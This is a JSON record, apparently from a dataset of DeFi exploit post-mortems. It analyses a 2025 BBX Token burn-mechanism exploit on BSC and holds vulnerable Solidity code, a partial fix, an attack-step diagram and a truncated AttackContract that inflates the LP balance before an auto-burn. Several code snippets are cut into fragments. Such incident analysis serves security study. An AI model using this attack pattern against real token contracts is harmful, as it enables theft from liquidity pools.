@@ -1,0 +1,33 @@
+{
+ "id": "2025__2025-03-20_BBXToken_BurnMechanism",
+ "source_file": "2025/2025-03-20_BBXToken_BurnMechanism.md",
+ "title": "BBX Token — Burn Mechanism Exploitation Analysis",
+ "date": "2025-03-20",
+ "protocol": "BBX Token",
+ "chain": "BSC",
+ "loss_raw": "11,902 BUSD",
+ "loss_usd": null,
+ "root_cause": "Exploitation of timing and burn amount calculation logic vulnerabilities in the auto-burn mechanism",
+ "attack_tx": "0x0dd48636...",
+ "vulnerable_contract": "0x6051428b580f561b627247119eed4d0483b8d28e",
+ "classes": [
+  "defl-tax-token"
+ ],
+ "code_before": [
+  "❌ Vulnerable burn mechanism\nfunction _transfer(address from, address to, uint256 amount) internal override {\n    uint256 lastBurn = lastBurnTime();\n    uint256 burnGap = lastBurnGapTime();\n\n    if (block.timestamp - lastBurn >= burnGap) {\n        address lp = liquidityPool();\n        uint256 burnAmount = balanceOf(lp) * burnRate() / 10000;\n        //",
+  "❌ burnAmount depends on balanceOf(lp), which can be externally manipulated\n        _burn(lp, burnAmount);\n        IUniswapV2Pair(lp).sync(); // update reserves\n    }\n    super._transfer(from, to, amount);\n}\n\n//",
+  "// From: BBXToken.sol\n\nuint256 public burnRate = 300;           // 3%\nuint256 public lastBurnTime;\nuint256 public lastBurnGapTime = 1 days; // burn fires at most once per day\naddress public liquidityPool;            // the BBX/BUSD PancakeSwap pair\n\nfunction _transfer(address from, address recipient, uint256 amount) internal override {\n    if (block.timestamp >= lastBurnTime + lastBurnGapTime) {\n        uint256 totalNum = this.balanceOf(liquidityPool); // ❌ reads current LP balance — manipulable by direct transfer\n        uint256 burnNum = totalNum * burnRate / 10000;    // ❌ burnNum scales linearly with LP balance\n        super._transfer(liquidityPool, address(0xdead), burnNum); // burn from LP\n        IPancakePari(liquidityPool).sync();               // update pair reserves\n        lastBurnTime = block.timestamp;                   // reset timer\n    }\n\n    if (isExcludedFromFee[from] || isExcludedFromFee[recipient]) {\n        super._transfer(from, recipient, amount);\n        return;\n    }\n\n    if (from == liquidityPool) {\n        uint256 taxAmount = (amount * buyorsellTax) / 10000;\n        uint256 amountAfterTax = amount - taxAmount;\n        uint256 tax1 = (taxAmount * 20) / 30;\n        uint256 tax2 = (taxAmount * 10) / 30;\n        super._transfer(from, buyorsellTaxWallet, tax1);\n        super._transfer(from, dividendAddress, tax2);\n        super._transfer(from, recipient, amountAfterTax);\n        return;\n    }\n\n    if (recipient == liquidityPool) {\n        uint256 taxAmount = (amount * buyorsellTax) / 10000;\n        uint256 amountAfterTax = amount - taxAmount;\n        uint256 tax1 = (taxAmount * 20) / 30;\n        uint256 tax2 = (taxAmount * 10) / 30;\n        super._transfer(from, buyorsellTaxWallet, tax2);\n        super._transfer(from, dividendAddress, tax1);\n        super._transfer(from, recipient, amountAfterTax);\n        return;\n    }\n    super._transfer(from, recipient, amount);\n}"
+ ],
+ "code_after": [
+  "✅ Improved code\nfunction _autoBurn() internal {\n    uint256 burnAmount = FIXED_BURN_AMOUNT; //",
+  "✅ fixed burn amount, or\n    // alternatively use TWAP-based calculation\n    require(burnAmount <= MAX_BURN_PER_INTERVAL, \"Burn too large\"); //"
+ ],
+ "steps": [
+  "► balanceOf(lp) increases → burn amount amplified",
+  "► Excessive BBX burned → price spikes sharply"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─► Deploy contract (calculate burn trigger timing)\n  │         └─► Analyze lastBurnTime + lastBurnGapTime\n  │\n  ├─[2]─► Deposit large amount of BBX into BBX/BUSD LP pool just before burn\n  │         └─► balanceOf(lp) increases → burn amount amplified\n  │\n  ├─[3]─► Call transfer() to trigger auto-burn\n  │         └─► Excessive BBX burned → price spikes sharply\n  │\n  ├─[4]─► Sell pre-held BBX at inflated price for BUSD\n  │\n  └─[5]─► Net profit: ~11,902 BUSD",
+  "contract AttackContract {\n    function attack() public {\n        // [1] Analyze burn timing\n        uint256 lastBurn = IBBXToken(BBX).lastBurnTime();\n        uint256 burnGap = IBBXToken(BBX).lastBurnGapTime();\n\n        // [2] Wait until just before the burn window (using vm.warp)\n        // In the actual attack, timing was captured via mempool monitoring\n\n        // [3] Send large amount of BBX directly to LP pool to amplify burn amount\n        IERC20(BBX).transfer(IBBXToken(BBX).liquidityPool(), LARGE_AMOUNT);\n\n        // [4] Trigger burn (call any arbitrary transfer)\n        IERC20(BBX).transfer(address(this), 1); // trigger auto-burn\n\n        // [5] Sell held BBX after price spike\n        IERC20(BBX).approve(PANCAKE_ROUTER, type(uint256).max);\n        // swapExactTokensForTokens(BBX → B"
+ ]
+}
